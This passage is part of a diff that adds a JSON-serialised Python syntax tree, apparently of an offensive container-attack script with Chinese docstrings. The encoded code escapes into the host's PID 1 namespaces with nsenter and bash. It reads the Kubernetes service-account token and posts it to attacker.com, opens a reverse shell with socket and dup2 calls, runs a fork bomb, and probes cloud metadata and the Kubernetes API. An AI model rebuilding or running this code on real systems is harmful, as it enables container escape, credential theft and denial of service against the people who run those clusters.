+              "kind": null
+            }
+          },
+          {
+            "id": 1201,
+            "type": "Expr",
+            "lineno": 83,
+            "col_offset": 4,
+            "value": {
+              "id": 12011,
+              "type": "Call",
+              "lineno": 83,
+              "col_offset": 4,
+              "func": {
+                "id": 120111,
+                "type": "Attribute",
+                "lineno": 83,
+                "col_offset": 4,
+                "value": {
+                  "id": "subprocess",
+                  "type": "Name",
+                  "lineno": 83,
+                  "col_offset": 4,
+                  "ctx": {
+                    "id": 12011111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "call",
+                "ctx": {
+                  "id": 1201111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 1201100,
+                  "type": "List",
+                  "lineno": 83,
+                  "col_offset": 20,
+                  "elts": [
+                    {
+                      "id": 120110000,
+                      "type": "Constant",
+                      "lineno": 83,
+                      "col_offset": 21,
+                      "value": "nsenter",
+                      "kind": null
+                    },
+                    {
+                      "id": 120110001,
+                      "type": "Constant",
+                      "lineno": 83,
+                      "col_offset": 32,
+                      "value": "-t",
+                      "kind": null
+                    },
+                    {
+                      "id": 120110002,
+                      "type": "Constant",
+                      "lineno": 83,
+                      "col_offset": 38,
+                      "value": "1",
+                      "kind": null
+                    },
+                    {
+                      "id": 120110003,
+                      "type": "Constant",
+                      "lineno": 83,
+                      "col_offset": 43,
+                      "value": "-a",
+                      "kind": null
+                    },
+                    {
+                      "id": 120110004,
+                      "type": "Constant",
+                      "lineno": 83,
+                      "col_offset": 49,
+                      "value": "/bin/bash",
+                      "kind": null
+                    }
+                  ],
+                  "ctx": {
+                    "id": 12011001,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                }
+              ],
+              "keywords": []
+            }
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 13,
+        "type": "FunctionDef",
+        "lineno": 88,
+        "col_offset": 0,
+        "name": "steal_k8s_token",
+        "args": {
+          "id": 131,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 1300,
+            "type": "Expr",
+            "lineno": 89,
+            "col_offset": 4,
+            "value": {
+              "id": 13001,
+              "type": "Constant",
+              "lineno": 89,
+              "col_offset": 4,
+              "value": "窃取Kubernetes凭证",
+              "kind": null
+            }
+          },
+          {
+            "id": 1301,
+            "type": "Assign",
+            "lineno": 90,
+            "col_offset": 4,
+            "targets": [
+              {
+                "id": "token_path",
+                "type": "Name",
+                "lineno": 90,
+                "col_offset": 4,
+                "ctx": {
+                  "id": 1301001,
+                  "type": "Store",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              }
+            ],
+            "value": {
+              "id": 13011,
+              "type": "Constant",
+              "lineno": 90,
+              "col_offset": 17,
+              "value": "/var/run/secrets/kubernetes.io/serviceaccount/token",
+              "kind": null
+            },
+            "type_comment": null
+          },
+          {
+            "id": 1302,
+            "type": "If",
+            "lineno": 91,
+            "col_offset": 4,
+            "test": {
+              "id": 13021,
+              "type": "Call",
+              "lineno": 91,
+              "col_offset": 7,
+              "func": {
+                "id": 130211,
+                "type": "Attribute",
+                "lineno": 91,
+                "col_offset": 7,
+                "value": {
+                  "id": 1302111,
+                  "type": "Attribute",
+                  "lineno": 91,
+                  "col_offset": 7,
+                  "value": {
+                    "id": "os",
+                    "type": "Name",
+                    "lineno": 91,
+                    "col_offset": 7,
+                    "ctx": {
+                      "id": 130211111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "attr": "path",
+                  "ctx": {
+                    "id": 13021111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "exists",
+                "ctx": {
+                  "id": 1302111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": "token_path",
+                  "type": "Name",
+                  "lineno": 91,
+                  "col_offset": 22,
+                  "ctx": {
+                    "id": 13021001,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                }
+              ],
+              "keywords": []
+            },
+            "body": [
+              {
+                "id": 130200,
+                "type": "With",
+                "lineno": 92,
+                "col_offset": 8,
+                "items": [
+                  {
+                    "id": 13020000,
+                    "type": "withitem",
+                    "lineno": null,
+                    "col_offset": null,
+                    "context_expr": {
+                      "id": 130200001,
+                      "type": "Call",
+                      "lineno": 92,
+                      "col_offset": 13,
+                      "func": {
+                        "id": "open",
+                        "type": "Name",
+                        "lineno": 92,
+                        "col_offset": 13,
+                        "ctx": {
+                          "id": 13020000111,
+                          "type": "Load",
+                          "lineno": null,
+                          "col_offset": null
+                        }
+                      },
+                      "args": [
+                        {
+                          "id": "token_path",
+                          "type": "Name",
+                          "lineno": 92,
+                          "col_offset": 18,
+                          "ctx": {
+                            "id": 130200001001,
+                            "type": "Load",
+                            "lineno": null,
+                            "col_offset": null
+                          }
+                        },
+                        {
+                          "id": 13020000101,
+                          "type": "Constant",
+                          "lineno": 92,
+                          "col_offset": 30,
+                          "value": "r",
+                          "kind": null
+                        }
+                      ],
+                      "keywords": []
+                    },
+                    "optional_vars": {
+                      "id": "f",
+                      "type": "Name",
+                      "lineno": 92,
+                      "col_offset": 38,
+                      "ctx": {
+                        "id": 1302000011,
+                        "type": "Store",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    }
+                  }
+                ],
+                "body": [
+                  {
+                    "id": 13020000,
+                    "type": "Assign",
+                    "lineno": 93,
+                    "col_offset": 12,
+                    "targets": [
+                      {
+                        "id": "token",
+                        "type": "Name",
+                        "lineno": 93,
+                        "col_offset": 12,
+                        "ctx": {
+                          "id": 13020000001,
+                          "type": "Store",
+                          "lineno": null,
+                          "col_offset": null
+                        }
+                      }
+                    ],
+                    "value": {
+                      "id": 130200001,
+                      "type": "Call",
+                      "lineno": 93,
+                      "col_offset": 20,
+                      "func": {
+                        "id": 1302000011,
+                        "type": "Attribute",
+                        "lineno": 93,
+                        "col_offset": 20,
+                        "value": {
+                          "id": "f",
+                          "type": "Name",
+                          "lineno": 93,
+                          "col_offset": 20,
+                          "ctx": {
+                            "id": 130200001111,
+                            "type": "Load",
+                            "lineno": null,
+                            "col_offset": null
+                          }
+                        },
+                        "attr": "read",
+                        "ctx": {
+                          "id": 13020000111,
+                          "type": "Load",
+                          "lineno": null,
+                          "col_offset": null
+                        }
+                      },
+                      "args": [],
+                      "keywords": []
+                    },
+                    "type_comment": null
+                  },
+                  {
+                    "id": 13020001,
+                    "type": "Expr",
+                    "lineno": 95,
+                    "col_offset": 12,
+                    "value": {
+                      "id": 130200011,
+                      "type": "Call",
+                      "lineno": 95,
+                      "col_offset": 12,
+                      "func": {
+                        "id": 1302000111,
+                        "type": "Attribute",
+                        "lineno": 95,
+                        "col_offset": 12,
+                        "value": {
+                          "id": "requests",
+                          "type": "Name",
+                          "lineno": 95,
+                          "col_offset": 12,
+                          "ctx": {
+                            "id": 130200011111,
+                            "type": "Load",
+                            "lineno": null,
+                            "col_offset": null
+                          }
+                        },
+                        "attr": "post",
+                        "ctx": {
+                          "id": 13020001111,
+                          "type": "Load",
+                          "lineno": null,
+                          "col_offset": null
+                        }
+                      },
+                      "args": [
+                        {
+                          "id": 13020001100,
+                          "type": "Constant",
+                          "lineno": 95,
+                          "col_offset": 26,
+                          "value": "http://attacker.com/collect",
+                          "kind": null
+                        }
+                      ],
+                      "keywords": [
+                        {
+                          "id": 13020001100,
+                          "type": "keyword",
+                          "lineno": 95,
+                          "col_offset": 57,
+                          "arg": "data",
+                          "value": {
+                            "id": 130200011001,
+                            "type": "Dict",
+                            "lineno": 95,
+                            "col_offset": 62,
+                            "keys": [
+                              {
+                                "id": 13020001100100,
+                                "type": "Constant",
+                                "lineno": 95,
+                                "col_offset": 63,
+                                "value": "token",
+                                "kind": null
+                              }
+                            ],
+                            "values": [
+                              {
+                                "id": "token",
+                                "type": "Name",
+                                "lineno": 95,
+                                "col_offset": 72,
+                                "ctx": {
+                                  "id": 130200011001001,
+                                  "type": "Load",
+                                  "lineno": null,
+                                  "col_offset": null
+                                }
+                              }
+                            ]
+                          }
+                        }
+                      ]
+                    }
+                  }
+                ],
+                "type_comment": null
+              }
+            ],
+            "orelse": []
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 14,
+        "type": "FunctionDef",
+        "lineno": 98,
+        "col_offset": 0,
+        "name": "reverse_shell",
+        "args": {
+          "id": 141,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [
+            {
+              "id": 14100,
+              "type": "arg",
+              "lineno": 98,
+              "col_offset": 18,
+              "arg": "host",
+              "annotation": null,
+              "type_comment": null
+            },
+            {
+              "id": 14101,
+              "type": "arg",
+              "lineno": 98,
+              "col_offset": 24,
+              "arg": "port",
+              "annotation": null,
+              "type_comment": null
+            }
+          ],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 1400,
+            "type": "Expr",
+            "lineno": 99,
+            "col_offset": 4,
+            "value": {
+              "id": 14001,
+              "type": "Constant",
+              "lineno": 99,
+              "col_offset": 4,
+              "value": "建立反弹Shell连接",
+              "kind": null
+            }
+          },
+          {
+            "id": 1401,
+            "type": "Assign",
+            "lineno": 100,
+            "col_offset": 4,
+            "targets": [
+              {
+                "id": "s",
+                "type": "Name",
+                "lineno": 100,
+                "col_offset": 4,
+                "ctx": {
+                  "id": 1401001,
+                  "type": "Store",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              }
+            ],
+            "value": {
+              "id": 14011,
+              "type": "Call",
+              "lineno": 100,
+              "col_offset": 8,
+              "func": {
+                "id": 140111,
+                "type": "Attribute",
+                "lineno": 100,
+                "col_offset": 8,
+                "value": {
+                  "id": "socket",
+                  "type": "Name",
+                  "lineno": 100,
+                  "col_offset": 8,
+                  "ctx": {
+                    "id": 14011111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "socket",
+                "ctx": {
+                  "id": 1401111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 1401100,
+                  "type": "Attribute",
+                  "lineno": 100,
+                  "col_offset": 22,
+                  "value": {
+                    "id": "socket",
+                    "type": "Name",
+                    "lineno": 100,
+                    "col_offset": 22,
+                    "ctx": {
+                      "id": 140110011,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "attr": "AF_INET",
+                  "ctx": {
+                    "id": 14011001,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                {
+                  "id": 1401101,
+                  "type": "Attribute",
+                  "lineno": 100,
+                  "col_offset": 38,
+                  "value": {
+                    "id": "socket",
+                    "type": "Name",
+                    "lineno": 100,
+                    "col_offset": 38,
+                    "ctx": {
+                      "id": 140110111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "attr": "SOCK_STREAM",
+                  "ctx": {
+                    "id": 14011011,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                }
+              ],
+              "keywords": []
+            },
+            "type_comment": null
+          },
+          {
+            "id": 1402,
+            "type": "Expr",
+            "lineno": 101,
+            "col_offset": 4,
+            "value": {
+              "id": 14021,
+              "type": "Call",
+              "lineno": 101,
+              "col_offset": 4,
+              "func": {
+                "id": 140211,
+                "type": "Attribute",
+                "lineno": 101,
+                "col_offset": 4,
+                "value": {
+                  "id": "s",
+                  "type": "Name",
+                  "lineno": 101,
+                  "col_offset": 4,
+                  "ctx": {
+                    "id": 14021111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "connect",
+                "ctx": {
+                  "id": 1402111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 1402100,
+                  "type": "Tuple",
+                  "lineno": 101,
+                  "col_offset": 14,
+                  "elts": [
+                    {
+                      "id": "host",
+                      "type": "Name",
+                      "lineno": 101,
+                      "col_offset": 15,
+                      "ctx": {
+                        "id": 1402100001,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    {
+                      "id": "port",
+                      "type": "Name",
+                      "lineno": 101,
+                      "col_offset": 21,
+                      "ctx": {
+                        "id": 1402100011,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    }
+                  ],
+                  "ctx": {
+                    "id": 14021001,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                }
+              ],
+              "keywords": []
+            }
+          },
+          {
+            "id": 1403,
+            "type": "Expr",
+            "lineno": 104,
+            "col_offset": 4,
+            "value": {
+              "id": 14031,
+              "type": "Call",
+              "lineno": 104,
+              "col_offset": 4,
+              "func": {
+                "id": 140311,
+                "type": "Attribute",
+                "lineno": 104,
+                "col_offset": 4,
+                "value": {
+                  "id": "os",
+                  "type": "Name",
+                  "lineno": 104,
+                  "col_offset": 4,
+                  "ctx": {
+                    "id": 14031111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "dup2",
+                "ctx": {
+                  "id": 1403111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 1403100,
+                  "type": "Call",
+                  "lineno": 104,
+                  "col_offset": 12,
+                  "func": {
+                    "id": 14031001,
+                    "type": "Attribute",
+                    "lineno": 104,
+                    "col_offset": 12,
+                    "value": {
+                      "id": "s",
+                      "type": "Name",
+                      "lineno": 104,
+                      "col_offset": 12,
+                      "ctx": {
+                        "id": 1403100111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "fileno",
+                    "ctx": {
+                      "id": 140310011,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [],
+                  "keywords": []
+                },
+                {
+                  "id": 1403101,
+                  "type": "Constant",
+                  "lineno": 104,
+                  "col_offset": 24,
+                  "value": "0",
+                  "kind": null
+                }
+              ],
+              "keywords": []
+            }
+          },
+          {
+            "id": 1404,
+            "type": "Expr",
+            "lineno": 105,
+            "col_offset": 4,
+            "value": {
+              "id": 14041,
+              "type": "Call",
+              "lineno": 105,
+              "col_offset": 4,
+              "func": {
+                "id": 140411,
+                "type": "Attribute",
+                "lineno": 105,
+                "col_offset": 4,
+                "value": {
+                  "id": "os",
+                  "type": "Name",
+                  "lineno": 105,
+                  "col_offset": 4,
+                  "ctx": {
+                    "id": 14041111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "dup2",
+                "ctx": {
+                  "id": 1404111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 1404100,
+                  "type": "Call",
+                  "lineno": 105,
+                  "col_offset": 12,
+                  "func": {
+                    "id": 14041001,
+                    "type": "Attribute",
+                    "lineno": 105,
+                    "col_offset": 12,
+                    "value": {
+                      "id": "s",
+                      "type": "Name",
+                      "lineno": 105,
+                      "col_offset": 12,
+                      "ctx": {
+                        "id": 1404100111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "fileno",
+                    "ctx": {
+                      "id": 140410011,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [],
+                  "keywords": []
+                },
+                {
+                  "id": 1404101,
+                  "type": "Constant",
+                  "lineno": 105,
+                  "col_offset": 24,
+                  "value": "1",
+                  "kind": null
+                }
+              ],
+              "keywords": []
+            }
+          },
+          {
+            "id": 1405,
+            "type": "Expr",
+            "lineno": 106,
+            "col_offset": 4,
+            "value": {
+              "id": 14051,
+              "type": "Call",
+              "lineno": 106,
+              "col_offset": 4,
+              "func": {
+                "id": 140511,
+                "type": "Attribute",
+                "lineno": 106,
+                "col_offset": 4,
+                "value": {
+                  "id": "os",
+                  "type": "Name",
+                  "lineno": 106,
+                  "col_offset": 4,
+                  "ctx": {
+                    "id": 14051111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "dup2",
+                "ctx": {
+                  "id": 1405111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 1405100,
+                  "type": "Call",
+                  "lineno": 106,
+                  "col_offset": 12,
+                  "func": {
+                    "id": 14051001,
+                    "type": "Attribute",
+                    "lineno": 106,
+                    "col_offset": 12,
+                    "value": {
+                      "id": "s",
+                      "type": "Name",
+                      "lineno": 106,
+                      "col_offset": 12,
+                      "ctx": {
+                        "id": 1405100111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "fileno",
+                    "ctx": {
+                      "id": 140510011,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [],
+                  "keywords": []
+                },
+                {
+                  "id": 1405101,
+                  "type": "Constant",
+                  "lineno": 106,
+                  "col_offset": 24,
+                  "value": "2",
+                  "kind": null
+                }
+              ],
+              "keywords": []
+            }
+          },
+          {
+            "id": 1406,
+            "type": "Expr",
+            "lineno": 109,
+            "col_offset": 4,
+            "value": {
+              "id": 14061,
+              "type": "Call",
+              "lineno": 109,
+              "col_offset": 4,
+              "func": {
+                "id": 140611,
+                "type": "Attribute",
+                "lineno": 109,
+                "col_offset": 4,
+                "value": {
+                  "id": "subprocess",
+                  "type": "Name",
+                  "lineno": 109,
+                  "col_offset": 4,
+                  "ctx": {
+                    "id": 14061111,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                },
+                "attr": "call",
+                "ctx": {
+                  "id": 1406111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [
+                {
+                  "id": 1406100,
+                  "type": "List",
+                  "lineno": 109,
+                  "col_offset": 20,
+                  "elts": [
+                    {
+                      "id": 140610000,
+                      "type": "Constant",
+                      "lineno": 109,
+                      "col_offset": 21,
+                      "value": "/bin/bash",
+                      "kind": null
+                    },
+                    {
+                      "id": 140610001,
+                      "type": "Constant",
+                      "lineno": 109,
+                      "col_offset": 34,
+                      "value": "-i",
+                      "kind": null
+                    }
+                  ],
+                  "ctx": {
+                    "id": 14061001,
+                    "type": "Load",
+                    "lineno": null,
+                    "col_offset": null
+                  }
+                }
+              ],
+              "keywords": []
+            }
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 15,
+        "type": "FunctionDef",
+        "lineno": 114,
+        "col_offset": 0,
+        "name": "fork_bomb",
+        "args": {
+          "id": 151,
+          "type": "arguments",
+          "lineno": null,
+          "col_offset": null,
+          "posonlyargs": [],
+          "args": [],
+          "vararg": null,
+          "kwonlyargs": [],
+          "kw_defaults": [],
+          "kwarg": null,
+          "defaults": []
+        },
+        "body": [
+          {
+            "id": 1500,
+            "type": "Expr",
+            "lineno": 115,
+            "col_offset": 4,
+            "value": {
+              "id": 15001,
+              "type": "Constant",
+              "lineno": 115,
+              "col_offset": 4,
+              "value": "进程耗尽攻击",
+              "kind": null
+            }
+          },
+          {
+            "id": 1501,
+            "type": "While",
+            "lineno": 116,
+            "col_offset": 4,
+            "test": {
+              "id": 15011,
+              "type": "Constant",
+              "lineno": 116,
+              "col_offset": 10,
+              "value": "True",
+              "kind": null
+            },
+            "body": [
+              {
+                "id": 150100,
+                "type": "Expr",
+                "lineno": 117,
+                "col_offset": 8,
+                "value": {
+                  "id": 1501001,
+                  "type": "Call",
+                  "lineno": 117,
+                  "col_offset": 8,
+                  "func": {
+                    "id": 15010011,
+                    "type": "Attribute",
+                    "lineno": 117,
+                    "col_offset": 8,
+                    "value": {
+                      "id": "os",
+                      "type": "Name",
+                      "lineno": 117,
+                      "col_offset": 8,
+                      "ctx": {
+                        "id": 1501001111,
+                        "type": "Load",
+                        "lineno": null,
+                        "col_offset": null
+                      }
+                    },
+                    "attr": "fork",
+                    "ctx": {
+                      "id": 150100111,
+                      "type": "Load",
+                      "lineno": null,
+                      "col_offset": null
+                    }
+                  },
+                  "args": [],
+                  "keywords": []
+                }
+              }
+            ],
+            "orelse": []
+          }
+        ],
+        "decorator_list": [],
+        "returns": null,
+        "type_comment": null
+      },
+      {
+        "id": 16,
+        "type": "If",
+        "lineno": 119,
+        "col_offset": 0,
+        "test": {
+          "id": 161,
+          "type": "Compare",
+          "lineno": 119,
+          "col_offset": 3,
+          "left": {
+            "id": "__name__",
+            "type": "Name",
+            "lineno": 119,
+            "col_offset": 3,
+            "ctx": {
+              "id": 16111,
+              "type": "Load",
+              "lineno": null,
+              "col_offset": null
+            }
+          },
+          "ops": [
+            {
+              "id": 16100,
+              "type": "Eq",
+              "lineno": null,
+              "col_offset": null
+            }
+          ],
+          "comparators": [
+            {
+              "id": 16100,
+              "type": "Constant",
+              "lineno": 119,
+              "col_offset": 15,
+              "value": "__main__",
+              "kind": null
+            }
+          ]
+        },
+        "body": [
+          {
+            "id": 1600,
+            "type": "Expr",
+            "lineno": 121,
+            "col_offset": 4,
+            "value": {
+              "id": 16001,
+              "type": "Call",
+              "lineno": 121,
+              "col_offset": 4,
+              "func": {
+                "id": "check_container_env",
+                "type": "Name",
+                "lineno": 121,
+                "col_offset": 4,
+                "ctx": {
+                  "id": 1600111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [],
+              "keywords": []
+            }
+          },
+          {
+            "id": 1601,
+            "type": "Expr",
+            "lineno": 122,
+            "col_offset": 4,
+            "value": {
+              "id": 16011,
+              "type": "Call",
+              "lineno": 122,
+              "col_offset": 4,
+              "func": {
+                "id": "probe_cloud_metadata",
+                "type": "Name",
+                "lineno": 122,
+                "col_offset": 4,
+                "ctx": {
+                  "id": 1601111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [],
+              "keywords": []
+            }
+          },
+          {
+            "id": 1602,
+            "type": "Expr",
+            "lineno": 123,
+            "col_offset": 4,
+            "value": {
+              "id": 16021,
+              "type": "Call",
+              "lineno": 123,
+              "col_offset": 4,
+              "func": {
+                "id": "probe_k8s_api",
+                "type": "Name",
+                "lineno": 123,
+                "col_offset": 4,
+                "ctx": {
+                  "id": 1602111,
+                  "type": "Load",
+                  "lineno": null,
+                  "col_offset": null
+                }
+              },
+              "args": [],
+              "keywords": []
+            }
+          }
+        ],
+        "orelse": []
+      }
+    ],
+    "type_ignores": []
+  }
+}
